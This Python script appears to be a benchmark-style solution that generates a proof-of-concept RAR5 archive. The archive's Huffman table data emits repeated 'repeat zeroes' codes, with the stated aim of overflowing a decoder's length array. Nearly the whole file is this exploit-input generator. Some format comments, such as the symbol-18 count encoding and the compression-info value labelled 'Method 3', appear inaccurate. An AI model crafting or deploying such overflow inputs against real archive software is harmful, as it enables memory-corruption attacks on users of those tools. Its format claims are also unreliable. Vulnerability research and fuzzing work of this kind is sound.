import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 Signature: Rar!\x1a\x07\x01\x00
        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
        
        # Helper for Variable Integer (VINT) encoding
        def to_vint(n):
            out = bytearray()
            while True:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                    out.append(byte)
                else:
                    out.append(byte)
                    break
            return bytes(out)

        # --- 1. Main Archive Header ---
        # Type=1 (Main), Flags=0
        main_header_content = to_vint(1) + to_vint(0)
        mh_size_field = to_vint(len(main_header_content))
        
        # CRC is calculated over SizeField + Content
        mh_crc_payload = mh_size_field + main_header_content
        mh_crc = zlib.crc32(mh_crc_payload) & 0xFFFFFFFF
        main_header = struct.pack('<I', mh_crc) + mh_crc_payload
        
        # --- 2. Compressed Payload Generation ---
        class BitWriter:
            def __init__(self):
                self.bytes = bytearray()
                self.curr = 0
                self.bits_in_curr = 0
            
            def write(self, val, width):
                # RAR5 reads bits from MSB to LSB of the byte
                for i in range(width - 1, -1, -1):
                    bit = (val >> i) & 1
                    if bit:
                        self.curr |= (1 << (7 - self.bits_in_curr))
                    self.bits_in_curr += 1
                    if self.bits_in_curr == 8:
                        self.bytes.append(self.curr)
                        self.curr = 0
                        self.bits_in_curr = 0
                        
            def get_bytes(self):
                if self.bits_in_curr > 0:
                    self.bytes.append(self.curr)
                return bytes(self.bytes)

        bw = BitWriter()
        
        # 2.1 KeepOldTable = 0 (1 bit)
        bw.write(0, 1)
        
        # 2.2 Bit Lengths Table (20 * 4 bits)
        # We define a Huffman table to decode the Main Table lengths.
        # We target a specific encoding to allow us to emit RLE codes.
        # Mapping:
        # Sym 0  -> Length 1 -> Code '0'
        # Sym 18 -> Length 2 -> Code '10' (Binary)
        # Sym 18 represents "Repeat Zeroes".
        
        # The Pre-Table has 20 symbols. We send 4 bits (nibble) for each length.
        # Index 0: Length 1 (0001)
        bw.write(1, 4)
        # Indices 1..17: Length 0 (0000)
        for _ in range(17):
            bw.write(0, 4)
        # Index 18: Length 2 (0010)
        bw.write(2, 4)
        # Index 19: Length 0 (0000)
        bw.write(0, 4)
        
        # 2.3 Main Table Data
        # We want to overflow the Main Huffman Table Length array.
        # The array size is typically around 306.
        # We emit Sym 18 (Repeat Zeroes) with maximum count repeatedly.
        # Sym 18 Code: '10' (binary 2).
        # Count encoding for Sym 18: Read 7 bits, then add 11.
        # Max count = 127 + 11 = 138.
        # We write 3 sequences: 3 * 138 = 414, which is > 306, triggering overflow.
        
        for _ in range(3):
            bw.write(2, 2)    # Code '10'
            bw.write(127, 7)  # Count 127 ('1111111')
            
        payload = bw.get_bytes()
        
        # --- 3. File Header ---
        block_type = 2
        block_flags = 0x0002 # Has Data Area
        
        # File Header Specifics
        fh_flags = 0 
        unp_size = 1024 
        attribs = 0
        comp_info = 0x18 # Method 3 (Normal), 128KB dictionary
        host_os = 0 # Windows
        name = b'poc'
        name_len = len(name)
        
        fh_specific = bytearray()
        fh_specific.extend(to_vint(fh_flags))
        fh_specific.extend(to_vint(unp_size))
        fh_specific.extend(to_vint(attribs))
        fh_specific.extend(to_vint(comp_info))
        fh_specific.extend(to_vint(host_os))
        fh_specific.extend(to_vint(name_len))
        fh_specific.extend(name)
        
        # Block Content = Type + Flags + DataSize + Specifics
        block_content = bytearray()
        block_content.extend(to_vint(block_type))
        block_content.extend(to_vint(block_flags))
        block_content.extend(to_vint(len(payload)))
        block_content.extend(fh_specific)
        
        # Block Size Field
        block_size_field = to_vint(len(block_content))
        
        # CRC
        crc_payload = block_size_field + block_content
        block_crc = zlib.crc32(crc_payload) & 0xFFFFFFFF
        
        file_block = struct.pack('<I', block_crc) + crc_payload + payload
        
        return sig + main_header + file_block